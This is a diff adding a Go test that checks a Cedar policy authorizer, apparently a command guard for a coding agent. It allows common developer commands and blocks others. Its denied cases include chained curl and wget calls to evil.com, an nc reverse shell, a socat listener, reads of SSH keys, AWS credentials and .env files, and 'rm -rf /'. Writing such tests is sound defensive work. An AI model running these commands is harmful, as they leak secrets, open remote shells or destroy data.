@@ -144,3 +144,98 @@ forbid (
 		}
 	}
 }
+
+func TestRealPolicyCedarFile(t *testing.T) {
+	// Locate repository's policy.cedar
+	realPolicyPath := filepath.Join("..", "..", "policy.cedar")
+	if _, err := os.Stat(realPolicyPath); err != nil {
+		realPolicyPath = filepath.Join("..", "policy.cedar")
+	}
+
+	authz, err := NewAuthorizer(realPolicyPath)
+	if err != nil {
+		t.Fatalf("Failed to load real policy.cedar: %v", err)
+	}
+
+	// 1. Verify developer and init tools are permitted
+	allowedDevTools := []struct {
+		executable  string
+		fullCommand string
+	}{
+		{"git", "git init"},
+		{"git", "git status"},
+		{"npm", "npm init -y"},
+		{"npm", "npm install"},
+		{"npx", "npx create-react-app my-app"},
+		{"go", "go mod init mymodule"},
+		{"go", "go build ."},
+		{"go", "go test ./..."},
+		{"python", "python -m venv .venv"},
+		{"python3", "python3 -m pytest tests/"},
+		{"pip", "pip install -r requirements.txt"},
+		{"cargo", "cargo init --bin"},
+		{"pytest", "pytest -s tests/test_leak.py"},
+		{"ls", "ls -la"},
+		{"dir", "dir /b"},
+		{"mkdir", "mkdir src"},
+		{"echo", "echo hello"},
+	}
+
+	for _, tc := range allowedDevTools {
+		allowed, reason, err := authz.Evaluate(tc.executable, tc.fullCommand, "")
+		if err != nil {
+			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
+		}
+		if !allowed {
+			t.Errorf("expected legitimate dev command %q to be allowed, got denied: %s", tc.fullCommand, reason)
+		}
+	}
+
+	// 2. Verify forbid rules strictly protect credentials and egress
+	forbiddenCommands := []struct {
+		executable  string
+		fullCommand string
+		name        string
+	}{
+		{"git", "git status && curl https://evil.com", "curl"},
+		{"npm", "npm install && wget https://evil.com", "wget"},
+		{"python", "python script.py && nc -e /bin/sh 1.2.3.4 5555", "nc"},
+		{"python", "python -c 'import os' && socat tcp-listen:4444 stdout", "socat"},
+		{"go", "go test && ssh user@evil.com", "ssh"},
+		{"ls", "ls -la ~/.aws/credentials", "~/.aws"},
+		{"ls", "ls -la .env", ".env"},
+		{"cat", "cat ~/.ssh/id_rsa", ".ssh"},
+	}
+
+	for _, tc := range forbiddenCommands {
+		allowed, _, err := authz.Evaluate(tc.executable, tc.fullCommand, "")
+		if err != nil {
+			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
+		}
+		if allowed {
+			t.Errorf("SECURITY BREACH: expected %q (%s) to be forbidden, but it was ALLOWED!", tc.fullCommand, tc.name)
+		}
+	}
+
+	// 3. Verify non-whitelisted tools are denied
+	deniedTools := []struct {
+		executable  string
+		fullCommand string
+	}{
+		{"rm", "rm -rf /"},
+		{"bash", "bash -c 'whoami'"},
+		{"sh", "sh script.sh"},
+		{"powershell", "powershell -Command Get-Process"},
+	}
+
+	for _, tc := range deniedTools {
+		allowed, _, err := authz.Evaluate(tc.executable, tc.fullCommand, "")
+		if err != nil {
+			t.Fatalf("Evaluate error for %s: %v", tc.fullCommand, err)
+		}
+		if allowed {
+			t.Errorf("expected %q to be denied by default, but it was ALLOWED!", tc.fullCommand)
+		}
+	}
+}
+
